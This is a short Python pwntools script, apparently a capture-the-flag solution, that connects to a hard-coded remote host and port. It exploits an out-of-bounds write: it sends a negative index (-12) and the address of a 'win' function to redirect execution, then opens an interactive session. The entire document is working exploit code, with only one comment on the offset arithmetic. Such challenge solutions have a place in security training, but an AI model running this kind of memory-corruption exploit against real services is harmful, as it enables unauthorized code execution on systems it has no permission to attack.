from pwn import *

HOST = "34.170.146.252"
PORT =27095

io = remote(HOST, PORT)
win_offset = 0x11e9
pos = -12 # 0xe8 - 0xd0 = 0x18 = 24 but this code is 2 bytes index, so 24/2 = 12

win_addr = win_offset + 0x1000
win_addr = int(win_addr)
io.sendlineafter(b"pos > ", str(pos).encode())
io.sendlineafter(b"val > ", str(win_addr).encode())
io.interactive()